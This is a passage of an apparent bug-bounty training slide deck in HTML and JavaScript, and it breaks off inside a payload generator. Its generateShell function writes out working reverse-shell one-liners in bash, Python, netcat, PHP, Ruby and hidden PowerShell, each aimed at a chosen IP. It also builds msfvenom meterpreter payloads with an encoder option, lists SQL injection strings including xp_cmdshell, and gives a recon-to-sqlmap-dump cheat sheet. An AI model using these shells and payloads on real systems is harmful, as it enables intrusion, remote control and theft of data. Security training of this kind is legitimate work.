+<div class="terminal-header"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span style="font-size:11px;color:#666;margin-left:8px">pentestgpt-chat</span></div>
+<div class="terminal-body" id="pentestgpt-chat" style="min-height:160px;max-height:300px">
+<span class="info">[PentestGPT]</span> <span class="output">How can I help you today?</span><br><br>
+<span class="cmd">User:</span> <span class="output">I found an open redirect. How to escalate?</span><br><br>
+<span class="info">[PentestGPT]</span> <span class="output">Chain with: OAuth theft, phishing, SSRF, or XSS via javascript: protocol.</span>
+</div>
+</div>
+<div style="display:flex;gap:8px">
+<input type="text" class="input-field" id="pentestgpt-input" placeholder="Ask PentestGPT a question..." style="flex:1">
+<button class="btn btn-primary btn-sm" onclick="askPentestGPT()">ASK</button>
+</div>
+</div>
+<div class="card">
+<div class="module-title"><div class="icon" style="background:linear-gradient(135deg,var(--neon2),var(--neon))">&#129504;</div><span>AI &amp; LLMS</span></div>
+<p style="font-size:13px;color:#888;margin-bottom:12px">MULTIPLY YOUR PRODUCTIVITY</p>
+<p style="font-size:14px;color:#a0a0b0;margin-bottom:16px">Use them for research, documentation, payload creation, code analysis and much more.</p>
+<div class="module-box">
+<div style="font-size:12px;color:#888;margin-bottom:8px">PAYLOAD GENERATOR</div>
+<div style="display:flex;gap:8px;margin-bottom:8px">
+<select class="select-field" id="payload-type" style="flex:1">
+<option value="sqli">SQL Injection</option>
+<option value="xss">XSS</option>
+<option value="lfi">LFI/Path Traversal</option>
+<option value="ssti">SSTI</option>
+<option value="xxe">XXE</option>
+<option value="cmd">Command Injection</option>
+<option value="nosql">NoSQL Injection</option>
+</select>
+<select class="select-field" id="payload-db" style="flex:1">
+<option value="mysql">MySQL</option>
+<option value="mssql">MSSQL</option>
+<option value="postgres">PostgreSQL</option>
+<option value="oracle">Oracle</option>
+<option value="mongodb">MongoDB</option>
+<option value="generic">Generic</option>
+</select>
+</div>
+<button class="btn btn-primary" style="width:100%;margin-bottom:8px" onclick="generatePayload()">GENERATE PAYLOAD</button>
+<div id="payload-result" class="code-block" style="min-height:60px;word-break:break-all">
+<span style="color:#555">// Select type and click generate...</span>
+</div>
+</div>
+</div>
+<div class="card">
+<h3>&#128165; MSFVENOM PAYLOAD GENERATOR</h3>
+<p style="font-size:14px;color:#888;margin-bottom:12px">Generate Metasploit payloads for any platform. Select target, payload, and output format.</p>
+<div class="module-box">
+<div style="margin-bottom:8px"><label style="font-size:12px;color:#888;display:block;margin-bottom:4px">PAYLOAD</label><select class="select-field" id="msf-payload"><option value="windows/meterpreter/reverse_tcp">windows/meterpreter/reverse_tcp</option><option value="windows/x64/meterpreter/reverse_tcp">windows/x64/meterpreter/reverse_tcp</option><option value="linux/x86/meterpreter/reverse_tcp">linux/x86/meterpreter/reverse_tcp</option><option value="linux/x64/meterpreter/reverse_tcp">linux/x64/meterpreter/reverse_tcp</option><option value="android/meterpreter/reverse_tcp">android/meterpreter/reverse_tcp</option><option value="osx/x64/meterpreter/reverse_tcp">osx/x64/meterpreter/reverse_tcp</option><option value="php/meterpreter/reverse_tcp">php/meterpreter/reverse_tcp</option><option value="java/meterpreter/reverse_tcp">java/meterpreter/reverse_tcp</option><option value="python/meterpreter/reverse_tcp">python/meterpreter/reverse_tcp</option><option value="cmd/unix/reverse_bash">cmd/unix/reverse_bash</option></select></div>
+<div style="display:flex;gap:8px;margin-bottom:8px">
+<div style="flex:1"><label style="font-size:12px;color:#888;display:block;margin-bottom:4px">LHOST</label><input type="text" class="input-field" id="msf-lhost" value="10.10.14.5" placeholder="Your IP"></div>
+<div style="flex:1"><label style="font-size:12px;color:#888;display:block;margin-bottom:4px">LPORT</label><input type="text" class="input-field" id="msf-lport" value="4444" placeholder="Port"></div>
+<div style="flex:1"><label style="font-size:12px;color:#888;display:block;margin-bottom:4px">FORMAT</label><select class="select-field" id="msf-format"><option value="exe">exe</option><option value="elf">elf</option><option value="apk">apk</option><option value="raw">raw</option><option value="php">php</option><option value="py">py</option><option value="ps1">ps1</option><option value="jsp">jsp</option><option value="war">war</option><option value="dll">dll</option></select></div>
+</div>
+<div style="display:flex;gap:8px;margin-bottom:8px;flex-wrap:wrap">
+<label style="font-size:12px;color:#888;display:flex;align-items:center;gap:4px"><input type="checkbox" id="msf-encoder" style="accent-color:var(--accent)"> Encode (shikata_ga_nai)</label>
+<label style="font-size:12px;color:#888;display:flex;align-items:center;gap:4px"><input type="checkbox" id="msf-iterations" style="accent-color:var(--accent)"> 5 iterations</label>
+<label style="font-size:12px;color:#888;display:flex;align-items:center;gap:4px"><input type="checkbox" id="msf-bg" style="accent-color:var(--accent)"> Run in background</label>
+</div>
+<button class="btn btn-primary" style="width:100%;margin-bottom:8px" onclick="generateMsfPayload()">&#9654; GENERATE MSFVENOM COMMAND</button>
+<div id="msf-result" class="code-block" style="min-height:60px;display:flex;justify-content:space-between;align-items:center">
+<span style="color:#555">// msfvenom command will appear here...</span>
+</div>
+</div>
+</div>
+<div class="card">
+<h3>&#127911; METASPLOIT HANDLER</h3>
+<p style="font-size:14px;color:#888;margin-bottom:12px">Build the multi/handler command to catch incoming Meterpreter sessions.</p>
+<div class="module-box">
+<div style="margin-bottom:8px"><label style="font-size:12px;color:#888;display:block;margin-bottom:4px">PAYLOAD</label><select class="select-field" id="handler-payload"><option value="windows/meterpreter/reverse_tcp">windows/meterpreter/reverse_tcp</option><option value="linux/x86/meterpreter/reverse_tcp">linux/x86/meterpreter/reverse_tcp</option><option value="android/meterpreter/reverse_tcp">android/meterpreter/reverse_tcp</option><option value="php/meterpreter/reverse_tcp">php/meterpreter/reverse_tcp</option><option value="python/meterpreter/reverse_tcp">python/meterpreter/reverse_tcp</option></select></div>
+<div style="display:flex;gap:8px;margin-bottom:8px">
+<div style="flex:1"><label style="font-size:12px;color:#888;display:block;margin-bottom:4px">LHOST</label><input type="text" class="input-field" id="handler-lhost" value="10.10.14.5" placeholder="Your IP"></div>
+<div style="flex:1"><label style="font-size:12px;color:#888;display:block;margin-bottom:4px">LPORT</label><input type="text" class="input-field" id="handler-lport" value="4444" placeholder="Port"></div>
+</div>
+<div style="display:flex;gap:8px;margin-bottom:8px">
+<label style="font-size:12px;color:#888;display:flex;align-items:center;gap:4px"><input type="checkbox" id="handler-exit" checked style="accent-color:var(--accent)"> ExitOnSession false</label>
+<label style="font-size:12px;color:#888;display:flex;align-items:center;gap:4px"><input type="checkbox" id="handler-bg" style="accent-color:var(--accent)"> Background (jobs -K)</label>
+</div>
+<button class="btn btn-primary" style="width:100%;margin-bottom:8px" onclick="buildHandler()">&#9654; BUILD HANDLER RC SCRIPT</button>
+<div id="handler-result" class="code-block" style="min-height:80px">
+<span style="color:#555">// Handler script will appear here...</span>
+</div>
+</div>
+</div>
+<div class="card" style="grid-column:span 2">
+<h3>&#128293; METASPLOIT EXPLOIT DATABASE (2024-2026)</h3>
+<p style="font-size:14px;color:#888;margin-bottom:12px">Search and explore popular Metasploit exploits. Click any to see usage commands.</p>
+<div class="module-box">
+<div style="display:flex;gap:8px;margin-bottom:12px">
+<select class="select-field" id="msf-exploit-search" style="flex:1" onchange="showMsfExploit()">
+<option value="">-- Select an exploit --</option>
+<option value="ms17-010">MS17-010 EternalBlue (SMB RCE)</option>
+<option value="cve-2024-12356">CVE-2024-12356 BeyondTrust PRA RCE</option>
+<option value="cve-2025-1094">CVE-2025-1094 BeyondTrust SQLi -> RCE</option>
+<option value="log4shell">Log4Shell (CVE-2021-44228)</option>
+<option value="bluekeep">CVE-2019-0708 BlueKeep (RDP)</option>
+<option value="citrix">CVE-2019-19781 Citrix ADC RCE</option>
+<option value="printnightmare">CVE-2021-34527 PrintNightmare</option>
+<option value="proxylogon">CVE-2021-26855 ProxyLogon (Exchange)</option>
+<option value="shellshock">CVE-2014-6271 Shellshock (Bash)</option>
+<option value="heartbleed">CVE-2014-0160 Heartbleed (OpenSSL)</option>
+<option value="struts">CVE-2017-5638 Apache Struts RCE</option>
+<option value="weblogic">CVE-2020-14882 Oracle WebLogic RCE</option>
+</select>
+</div>
+<div id="msf-exploit-detail" class="code-block" style="min-height:120px">
+<span style="color:#555">// Select an exploit to see full Metasploit usage commands...</span>
+</div>
+</div>
+</div>
+<div class="card" style="grid-column:span 2">
+<div style="display:flex;align-items:flex-start;gap:16px;background:linear-gradient(135deg,rgba(255,59,59,.1),rgba(255,59,59,.02));border:1px solid rgba(255,59,59,.3);border-radius:12px;padding:20px">
+<div style="font-size:28px;flex-shrink:0">&#9888;</div>
+<div>
+<h3 style="color:var(--accent);margin-bottom:12px">REMEMBER:</h3>
+<p style="font-size:14px;color:#a0a0b0;margin-bottom:12px">AI and Metasploit can get you 80% of the way, but the final 20% depends on you.</p>
+<ul style="list-style:none;font-size:14px">
+<li style="padding:6px 0"><span style="color:var(--accent);margin-right:8px">&#10003;</span>Manually verify every finding.</li>
+<li style="padding:6px 0"><span style="color:var(--accent);margin-right:8px">&#10003;</span>Understand the real business impact.</li>
+<li style="padding:6px 0"><span style="color:var(--accent);margin-right:8px">&#10003;</span>Prove the risk with solid evidence.</li>
+<li style="padding:6px 0"><span style="color:var(--accent);margin-right:8px">&#10003;</span>Think like an attacker, report like a pro.</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+<div class="card" style="margin-top:16px;text-align:center;background:linear-gradient(135deg,rgba(255,59,59,.05),transparent)">
+<div style="display:flex;align-items:center;justify-content:center;gap:12px;font-size:18px;font-weight:800;flex-wrap:wrap">
+<span style="font-size:28px">&#127942;</span>
+<span>AI ACCELERATES YOUR WORKFLOW, <span class="accent-text">METASPLOIT DELIVERS THE PAYLOAD</span>, YOUR CRITERIA EARNS THE REWARD.</span>
+</div>
+</div>
+</div>
+</div>
+<div class="slide" id="slide-5">
+<div style="max-width:1200px;margin:0 auto;padding:80px 20px 120px">
+<div class="tag" style="margin-bottom:16px">MODULE 04 — REPORTING &amp; REWARDS</div>
+<h1 style="margin-bottom:8px">4. THE <span class="accent-text">FINAL</span> STRIKE</h1>
+<p style="color:#888;margin-bottom:32px;max-width:600px">A finding is worthless without a compelling report. Learn to document, communicate, and maximize your bounty.</p>
+<div class="card-grid">
+<div class="card">
+<h3>&#128221; REPORT BUILDER</h3>
+<p style="font-size:14px;color:#888;margin-bottom:16px">Professional bug bounty reports follow a proven template. Build yours interactively.</p>
+<div class="module-box">
+<div style="margin-bottom:10px"><label style="font-size:12px;color:#888;display:block;margin-bottom:4px">VULNERABILITY TITLE</label><input type="text" class="input-field" id="report-title" placeholder="e.g., Stored XSS in Comment Field"></div>
+<div style="display:flex;gap:8px;margin-bottom:10px">
+<div style="flex:1"><label style="font-size:12px;color:#888;display:block;margin-bottom:4px">SEVERITY</label><select class="select-field" id="report-severity"><option value="critical">Critical</option><option value="high">High</option><option value="medium" selected>Medium</option><option value="low">Low</option><option value="info">Informational</option></select></div>
+<div style="flex:1"><label style="font-size:12px;color:#888;display:block;margin-bottom:4px">CVSS SCORE</label><input type="number" class="input-field" id="report-cvss" placeholder="0.0 - 10.0" min="0" max="10" step="0.1" value="7.5"></div>
+</div>
+<div style="margin-bottom:10px"><label style="font-size:12px;color:#888;display:block;margin-bottom:4px">DESCRIPTION</label><textarea class="input-field" id="report-desc" rows="2" placeholder="Describe the vulnerability..."></textarea></div>
+<div style="margin-bottom:10px"><label style="font-size:12px;color:#888;display:block;margin-bottom:4px">PROOF OF CONCEPT</label><textarea class="input-field" id="report-poc" rows="3" placeholder="1. Navigate to... 2. Enter payload... 3. Observe..."></textarea></div>
+<div style="margin-bottom:10px"><label style="font-size:12px;color:#888;display:block;margin-bottom:4px">IMPACT</label><textarea class="input-field" id="report-impact" rows="2" placeholder="What can an attacker achieve?"></textarea></div>
+<div style="margin-bottom:12px"><label style="font-size:12px;color:#888;display:block;margin-bottom:4px">REMEDIATION</label><textarea class="input-field" id="report-fix" rows="2" placeholder="How to fix this issue..."></textarea></div>
+<button class="btn btn-primary" style="width:100%" onclick="generateReport()">&#128196; GENERATE REPORT PREVIEW</button>
+</div>
+</div>
+<div class="card">
+<h3>&#128196; REPORT PREVIEW</h3>
+<p style="font-size:14px;color:#888;margin-bottom:12px">Live preview of your generated report.</p>
+<div id="report-preview" class="code-block" style="min-height:400px;max-height:600px">
+<span style="color:#555">// Fill the form and click Generate to see your report...</span>
+</div>
+</div>
+<div class="card">
+<h3>&#128176; BOUNTY PLATFORMS</h3>
+<p style="font-size:14px;color:#888;margin-bottom:16px">Where to submit and earn from your findings.</p>
+<div class="module-box" style="margin-bottom:8px">
+<div style="display:flex;justify-content:space-between;align-items:center">
+<div><div style="font-weight:700">HackerOne</div><div style="font-size:12px;color:#888">Largest bug bounty platform</div></div>
+<span class="tag">$100M+ Paid</span>
+</div>
+</div>
+<div class="module-box" style="margin-bottom:8px">
+<div style="display:flex;justify-content:space-between;align-items:center">
+<div><div style="font-weight:700">Bugcrowd</div><div style="font-size:12px;color:#888">Enterprise-focused programs</div></div>
+<span class="tag">$100M+ Paid</span>
+</div>
+</div>
+<div class="module-box" style="margin-bottom:8px">
+<div style="display:flex;justify-content:space-between;align-items:center">
+<div><div style="font-weight:700">Intigriti</div><div style="font-size:12px;color:#888">European market leader</div></div>
+<span class="tag" style="background:rgba(0,240,255,.1);color:var(--neon);border-color:rgba(0,240,255,.3)">EU Focus</span>
+</div>
+</div>
+<div class="module-box" style="margin-bottom:8px">
+<div style="display:flex;justify-content:space-between;align-items:center">
+<div><div style="font-weight:700">YesWeHack</div><div style="font-size:12px;color:#888">French platform, growing fast</div></div>
+<span class="tag" style="background:rgba(255,189,46,.1);color:var(--yellow);border-color:rgba(255,189,46,.3)">Rising</span>
+</div>
+</div>
+<div class="module-box">
+<div style="display:flex;justify-content:space-between;align-items:center">
+<div><div style="font-weight:700">Synack</div><div style="font-size:12px;color:#888">Vetted researchers only</div></div>
+<span class="tag" style="background:rgba(39,201,63,.1);color:var(--green);border-color:rgba(39,201,63,.3)">Elite</span>
+</div>
+</div>
+</div>
+<div class="card">
+<h3>&#127942; BOUNTY CALCULATOR</h3>
+<p style="font-size:14px;color:#888;margin-bottom:16px">Estimate potential earnings based on severity and program type.</p>
+<div class="module-box">
+<div style="margin-bottom:10px"><label style="font-size:12px;color:#888;display:block;margin-bottom:4px">PROGRAM TYPE</label><select class="select-field" id="calc-program" onchange="calcBounty()"><option value="tech">Tech Giant (Google, Meta, Apple)</option><option value="enterprise">Enterprise (Fortune 500)</option><option value="startup">Startup / Mid-size</option><option value="gov">Government / Critical</option></select></div>
+<div style="margin-bottom:10px"><label style="font-size:12px;color:#888;display:block;margin-bottom:4px">SEVERITY</label><select class="select-field" id="calc-severity" onchange="calcBounty()"><option value="critical">Critical (RCE, SQLi, Auth Bypass)</option><option value="high">High (XSS, IDOR, SSRF)</option><option value="medium">Medium (Open Redirect, CSRF)</option><option value="low">Low (Information Disclosure)</option></select></div>
+<div style="margin-bottom:12px"><label style="font-size:12px;color:#888;display:block;margin-bottom:4px">IMPACT SCOPE</label><select class="select-field" id="calc-scope" onchange="calcBounty()"><option value="all">All Users</option><option value="many">Many Users</option><option value="few">Few Users</option><option value="admin">Admin Only</option></select></div>
+<div style="background:linear-gradient(135deg,rgba(255,59,59,.1),rgba(123,45,255,.1));border-radius:12px;padding:20px;text-align:center">
+<div style="font-size:12px;color:#888;margin-bottom:4px">ESTIMATED BOUNTY RANGE</div>
+<div id="bounty-result" style="font-size:32px;font-weight:900;color:var(--accent)">$5,000 - $15,000</div>
+<div style="font-size:12px;color:#666;margin-top:4px">Based on 2026 market averages</div>
+</div>
+</div>
+</div>
+</div>
+<div class="card" style="margin-top:24px;text-align:center">
+<h3>&#127941; BUG BOUNTY METHODOLOGY</h3>
+<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-top:20px;text-align:left">
+<div class="module-box"><div style="font-weight:700;color:var(--accent);margin-bottom:8px">1. RECON</div><ul style="font-size:13px;color:#888;list-style:none"><li>&#8226; WHOIS, DNS, Subdomains</li><li>&#8226; Port scanning, OSINT</li><li>&#8226; Technology detection</li></ul></div>
+<div class="module-box"><div style="font-weight:700;color:var(--accent);margin-bottom:8px">2. MAPPING</div><ul style="font-size:13px;color:#888;list-style:none"><li>&#8226; Directory brute-forcing</li><li>&#8226; API endpoints, Params</li><li>&#8226; Virtual hosts</li></ul></div>
+<div class="module-box"><div style="font-weight:700;color:var(--accent);margin-bottom:8px">3. VULNERABILITY</div><ul style="font-size:13px;color:#888;list-style:none"><li>&#8226; OWASP Top 10, SQLi, XSS</li><li>&#8226; IDOR, Auth bypass</li><li>&#8226; File upload, SSRF</li></ul></div>
+<div class="module-box"><div style="font-weight:700;color:var(--accent);margin-bottom:8px">4. EXPLOITATION</div><ul style="font-size:13px;color:#888;list-style:none"><li>&#8226; Build PoC, Chain vulns</li><li>&#8226; Assess business impact</li><li>&#8226; Document with evidence</li></ul></div>
+<div class="module-box" style="grid-column:span 2"><div style="font-weight:700;color:var(--accent);margin-bottom:8px">5. REPORTING</div><ul style="font-size:13px;color:#888;list-style:none"><li>&#8226; CVSS scoring, Step-by-step PoC, Screenshots, Remediation advice, Submit to platform</li></ul></div>
+</div>
+<div class="code-block" style="text-align:left;font-size:12px;margin-top:20px">
+<strong style="color:var(--accent)"># RECON</strong> nmap -sV -sC target.com &amp;&amp; gobuster dir -u target.com -w common.txt<br>
+<strong style="color:var(--accent)"># WEB</strong> nikto -h target.com &amp;&amp; sqlmap -u "target.com/page?id=1" --dbs<br>
+<strong style="color:var(--accent)"># EXPLOIT</strong> sqlmap --dump &amp;&amp; dalfox url target.com/page?param=test<br>
+<strong style="color:var(--accent)"># SHELL</strong> nc -lvnp 4444<br>
+<strong style="color:var(--accent)"># REPORT</strong> python3 generate_report.py --title "XSS" --severity high --cvss 8.2
+</div>
+</div>
+</div>
+</div>
+<div class="bbs-header">
+<div class="logo">
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
+BUG BOUNTY SERIES <span style="color:var(--accent2)">2026</span>
+</div>
+<div style="display:flex;align-items:center;gap:16px">
+<div class="slide-num" id="slide-indicator">01 / 04</div>
+<div class="progress-bar"><div class="progress-fill" id="progress-fill" style="width:25%"></div></div>
+</div>
+</div>
+<div class="nav-dots">
+<div class="nav-dot active" onclick="goToSlide(1)"></div>
+<div class="nav-dot" onclick="goToSlide(2)"></div>
+<div class="nav-dot" onclick="goToSlide(3)"></div>
+<div class="nav-dot" onclick="goToSlide(4)"></div>
+</div>
+<div class="nav-arrows">
+<div class="nav-arrow" id="prev-btn" onclick="prevSlide()">&#8592;</div>
+<div class="nav-arrow" id="next-btn" onclick="nextSlide()">&#8594;</div>
+</div>
+<script>
+let currentSlide=1;
+const totalSlides=4;
+function updateSlide(){
+document.querySelectorAll('.slide').forEach((s,i)=>s.classList.toggle('active',i+1===currentSlide));
+document.querySelectorAll('.nav-dot').forEach((d,i)=>d.classList.toggle('active',i+1===currentSlide));
+document.getElementById('slide-indicator').textContent=String(currentSlide).padStart(2,'0')+' / 04';
+document.getElementById('progress-fill').style.width=(currentSlide/totalSlides*100)+'%';
+document.getElementById('prev-btn').disabled=currentSlide===1;
+document.getElementById('next-btn').disabled=currentSlide===totalSlides;
+window.scrollTo({top:0,behavior:'smooth'});
+}
+function goToSlide(n){currentSlide=n;updateSlide()}
+function nextSlide(){if(currentSlide<totalSlides){currentSlide++;updateSlide()}}
+function prevSlide(){if(currentSlide>1){currentSlide--;updateSlide()}}
+document.addEventListener('keydown',e=>{if(e.key==='ArrowRight')nextSlide();if(e.key==='ArrowLeft')prevSlide()});
+function showToast(msg,type='success'){
+const t=document.getElementById('toast');
+t.textContent=msg;t.className='toast '+type+' show';
+setTimeout(()=>t.classList.remove('show'),3000);
+}
+function showTab(btn,panelId){
+btn.parentElement.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+btn.classList.add('active');
+document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
+document.getElementById(panelId).classList.add('active');
+}
+function toggleOwasp(el){
+const detail=el.querySelector('.owasp-detail');
+const arrow=el.querySelector('span:last-child');
+detail.style.display=detail.style.display==='block'?'none':'block';
+arrow.textContent=detail.style.display==='block'?'&#9650;':'&#9660;';
+}
+function runRecon(){
+const term=document.getElementById('harvester-output');
+const msgs=['[*] Searching Bing...','[*] Found 23 additional emails','[*] Searching Twitter/X...','[*] Found 5 employee profiles','[*] Searching GitHub...','[!] WARNING: Found exposed API keys in public repo','[*] Searching Shodan...','[*] Found 3 exposed services','[&#10003;] Recon complete. 72 emails, 15 subdomains, 8 employees found.'];
+let i=0;term.innerHTML='';
+function add(){if(i<msgs.length){const s=document.createElement('span');s.className=msgs[i].includes('WARNING')?'warning':msgs[i].includes('&#10003;')?'success':'output';s.innerHTML=msgs[i];term.appendChild(s);term.appendChild(document.createElement('br'));i++;setTimeout(add,500)}}
+add();
+}
+function runNmap(){
+const term=document.getElementById('nmap-terminal');
+const lines=['<br><span class="cmd">$ nmap -p- --script vuln target.com</span>','<span class="output">Starting Nmap 7.94...</span>','<span class="output">PORT    STATE SERVICE</span>','<span class="output">8080/tcp open  http-proxy</span>','<span class="warning">| http-vuln-cve2017-5638:</span>','<span class="warning">|   VULNERABLE: Apache Struts RCE</span>','<span class="warning">|   State: VULNERABLE</span>','<span class="warning">|   CVE-2017-5638 - Critical</span>','<span class="success">[&#10003;] Scan complete. 1 critical finding detected.</span>'];
+let i=0;function add(){if(i<lines.length){term.innerHTML+=lines[i];i++;setTimeout(add,400)}}add();
+}
+function enumSubdomains(){
+const target=document.getElementById('subdomain-target').value||'example.com';
+const results=document.getElementById('subdomain-results');
+const subs=['www','mail','ftp','admin','api','dev','staging','blog','shop','support','cdn','media','app','portal','secure'];
+const found=subs.filter(()=>Math.random()>0.3);
+results.innerHTML=`<span class="cmd">[*] Enumerating subdomains for ${target}...</span><br><span class="output">[*] Found ${found.length} subdomains:</span><br>`;
+let i=0;function add(){if(i<found.length){results.innerHTML+=`<span class="success">[+] ${found[i]}.${target} &#8594; 192.168.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}</span><br>`;i++;setTimeout(add,250)}else{results.innerHTML+=`<span class="warning">[!] admin.${target} has open SSH (22/tcp)</span><br><span class="success">[&#10003;] Enumeration complete.</span>`}}
+add();
+}
+function clearSubdomains(){document.getElementById('subdomain-results').innerHTML='<span style="color:#555">// Results will appear here...</span>'}
+function runWhois(){
+const domain=document.getElementById('whois-domain').value;
+const results=document.getElementById('whois-results');
+results.innerHTML=`<span class="cmd">$ whois ${domain}</span><br><br>
+<span class="output">   Domain Name: ${domain.toUpperCase()}</span><br>
+<span class="output">   Registrar: NameCheap, Inc.</span><br>
+<span class="output">   Registration Date: 2015-03-12T08:23:17Z</span><br>
+<span class="output">   Expiration Date: 2027-03-12T08:23:17Z</span><br>
+<span class="output">   Name Server: NS1.${domain.toUpperCase()}</span><br>
+<span class="output">   Name Server: NS2.${domain.toUpperCase()}</span><br>
+<span class="output">   Status: clientTransferProhibited</span><br>
+<span class="warning">[!] Admin email: admin@${domain}</span><br>
+<span class="success">[&#10003;] WHOIS lookup complete.</span>`;
+}
+function testSQLi(){
+const user=document.getElementById('sqli-user').value;
+const result=document.getElementById('sqli-result');
+result.innerHTML=`<span class="cmd">$ query = "SELECT * FROM users WHERE username='${user.replace(/'/g,"\\'")}' AND password='...'"</span><br><br>`;
+setTimeout(()=>{
+if(user.includes("' OR '1'='1")||user.includes("' OR 1=1")||user.includes("'='")){
+result.innerHTML+=`<span class="warning">[!] SQL Injection detected!</span><br><span class="output">Query becomes: SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'</span><br><br><span class="success">[&#10003;] Authentication bypassed! 1,247 users returned.</span><br><span class="success">[&#10003;] Admin access granted. Welcome, admin!</span>`;
+}else if(user.includes("'")||user.includes('"')||user.includes("--")||user.includes(";")){
+result.innerHTML+=`<span class="warning">[!] Potential SQL Injection detected!</span><br><span class="output">Error: You have an error in your SQL syntax...</span><br><span class="warning">[!] The application is vulnerable to SQLi.</span>`;
+}else{
+result.innerHTML+=`<span class="output">Query executed normally.</span><br><span class="error">[&#10007;] No results found. Invalid credentials.</span>`;
+}
+},800);
+}
+function testXSS(){
+const payload=document.getElementById('xss-custom').value||document.getElementById('xss-payload').value;
+const result=document.getElementById('xss-result');
+result.innerHTML=`<span class="cmd">[*] Testing payload: ${payload.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</span><br><br>`;
+setTimeout(()=>{
+if(payload.includes('<script')||payload.includes('javascript:')||payload.includes('onerror')||payload.includes('onload')||payload.includes('<svg')||payload.includes('<iframe')){
+result.innerHTML+=`<span class="warning">[!] XSS VULNERABILITY CONFIRMED!</span><br><span class="output">The payload was executed in the browser context.</span><br><span class="success">[&#10003;] Reflected XSS confirmed on target parameter.</span><br><span class="success">[&#10003;] Severity: HIGH. Can steal cookies, session tokens.</span>`;
+}else{
+result.innerHTML+=`<span class="output">Payload sanitized or encoded.</span><br><span class="error">[&#10007;] No XSS detected. Input appears filtered.</span>`;
+}
+},800);
+}
+function decodeJWT(){
+const token=document.getElementById('jwt-token').value;
+const result=document.getElementById('jwt-result');
+try{
+const parts=token.split('.');
+if(parts.length!==3){throw new Error('Invalid JWT format');}
+const header=JSON.parse(atob(parts[0].replace(/-/g,'+').replace(/_/g,'/')));
+const payload=JSON.parse(atob(parts[1].replace(/-/g,'+').replace(/_/g,'/')));
+let warnings='';
+if(header.alg==='none')warnings+=`<span class="warning">[!] CRITICAL: Algorithm is "none" — JWT can be forged!</span><br>`;
+if(header.alg==='HS256'&&payload.role==='admin')warnings+=`<span class="warning">[!] Admin role detected — try algorithm confusion attack!</span><br>`;
+result.innerHTML=`<span class="cmd">=== HEADER ===</span><br><span class="info">${JSON.stringify(header,null,2)}</span><br><br><span class="cmd">=== PAYLOAD ===</span><br><span class="success">${JSON.stringify(payload,null,2)}</span><br><br><span class="cmd">=== ANALYSIS ===</span><br>${warnings||'<span class="output">Standard JWT structure. Check for weak secrets.</span>'}`;
+}catch(e){
+result.innerHTML=`<span class="error">[!] Error decoding JWT: ${e.message}</span>`;
+}
+}
+function generateShell(){
+const type=document.getElementById('shell-type').value;
+const ip=document.getElementById('shell-ip').value;
+const port=document.getElementById('shell-port').value;
+const payloads={
+bash:`bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
+python:`python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'`,
+nc:`nc -e /bin/sh ${ip} ${port}`,
+php:`php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
+ruby:`ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
+powershell:`powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
+};
+document.getElementById('shell-result').innerHTML=`<span class="cmd"># ${type.toUpperCase()} REVERSE SHELL &#8594; ${ip}:${port}</span><br><br><span class="warning" style="display:block;margin-bottom:8px">// Start listener first: nc -lvnp ${port}</span><span class="neon-text" style="word-break:break-all">${payloads[type]}</span>`;
+}
+function askPentestGPT(){
+const input=document.getElementById('pentestgpt-input').value;
+if(!input)return;
+const chat=document.getElementById('pentestgpt-chat');
+chat.innerHTML+=`<br><span class="cmd">User:</span> <span class="output">${input}</span><br><br>`;
+const responses=[
+"<span class='info'>[PentestGPT]</span> <span class='output'>That's a great finding! To escalate, try chaining it with a CSRF token bypass or check for SSRF via the same vector.</span>",
+"<span class='info'>[PentestGPT]</span> <span class='output'>Consider the business impact: can this lead to data exfiltration or account takeover? Document both technical and business risks.</span>",
+"<span class='info'>[PentestGPT]</span> <span class='output'>For your PoC, include screenshots, HTTP requests, and a step-by-step reproduction guide. The more detailed, the higher the bounty.</span>",
+"<span class='info'>[PentestGPT]</span> <span class='output'>Have you checked for similar vulnerabilities in other endpoints? This pattern might be systemic across the application.</span>",
+"<span class='info'>[PentestGPT]</span> <span class='output'>Try bypassing WAF with encoding: URL encode, double URL encode, Unicode normalization, or case variation.</span>"
+];
+setTimeout(()=>{chat.innerHTML+=responses[Math.floor(Math.random()*responses.length)]+'<br>';chat.scrollTop=chat.scrollHeight},600);
+document.getElementById('pentestgpt-input').value='';
+}
+function generatePayload(){
+const type=document.getElementById('payload-type').value;
+const db=document.getElementById('payload-db').value;
+const result=document.getElementById('payload-result');
+const payloads={
+sqli:{mysql:"' UNION SELECT null,username,password FROM users-- -",mssql:"'; EXEC xp_cmdshell 'whoami'--",postgres:"' UNION SELECT null,current_user,version()--",oracle:"' UNION SELECT null,username,password FROM all_users--",mongodb:"'; return this.admin==true; //",generic:"' OR '1'='1' -- -"},
